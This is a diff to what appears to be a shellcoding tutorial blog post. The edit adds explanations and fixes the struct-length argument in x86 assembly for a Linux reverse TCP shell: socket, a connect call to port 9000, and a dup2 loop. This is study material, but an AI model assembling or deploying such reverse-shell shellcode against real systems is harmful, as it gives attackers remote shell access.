@@ -70,6 +70,9 @@ registers. Finally, the value of protocol (EDX) isn't actually very relevant. Du
       mov esi, eax            ; Saves the value of eax for sockfd values later on.
 ```
 
+As explained on the previous post, we can see that the value of EAX is being saved on ESI, this will be from great help when referring to the socket syscall as a file 
+descriptor.
+
 ##### Connect
 
 ###### Initiate a connection on a socket
@@ -82,6 +85,9 @@ socklen_t addrlen);```. As you may see, the required flags are quite the same to
 + Chosen Port  (The chosen port will be pushed in hex as a word.)
 + AF_INET
 
+Furthermore, we have to satisfy the socklen_t addrlen argument as well. This requires the length of the previous struct, as like in the previous chapter, it was 16. This will be 
+reflected upon the value of DL
+
 ```term
 connect:
 
@@ -93,7 +99,7 @@ connect:
       push word 0x2823        ; Pushes 9000 in hex as a WORD.
       push word 0x02          ; Pushes AF_INET into the stack.
       mov ecx, esp            ; Copies the value of ESP into ECX.
-      mov dl, 30              ; The value 30 is inserted into DL, as this argument requires the length of the struct.
+      mov dl, 16              ; The value 16 is inserted into DL, as this argument requires the length of the struct.
       int 0x80                ; Call to kernel.
 ```
 
@@ -118,6 +124,7 @@ dup2:
 
       jnz dup2                ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.
 ```
+
 
 
 #### EndGame
